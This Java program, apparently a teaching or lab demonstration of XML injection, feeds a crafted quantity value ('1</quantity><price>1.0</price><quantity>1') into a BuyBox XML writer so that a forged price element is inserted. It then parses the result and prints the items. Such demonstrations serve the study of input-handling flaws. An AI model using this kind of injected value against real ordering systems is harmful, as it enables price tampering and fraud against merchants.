package com.xmlAttack.GeyangXie;

import java.io.BufferedOutputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.util.List;

import org.xml.*;

public class XMLAttack {
	public static void main(String[] args){
		String OUTPUT_FILE = "testFile.txt";
		OutputStream out = null;
		try {
			out = new FileOutputStream(OUTPUT_FILE);
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		BufferedOutputStream outStream = new BufferedOutputStream(out);
		
		try {
			BuyBox.getInstance().createXMLStream(outStream,"1</quantity><price>1.0</price><quantity>1");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	
		
		StaXParser parser = new StaXParser();
		List<Item> readConfig = parser.readConfig(OUTPUT_FILE);
		for (Item item : readConfig) {
            System.out.println(item);
    }
		System.out.println("Done");
	}
	
	
}





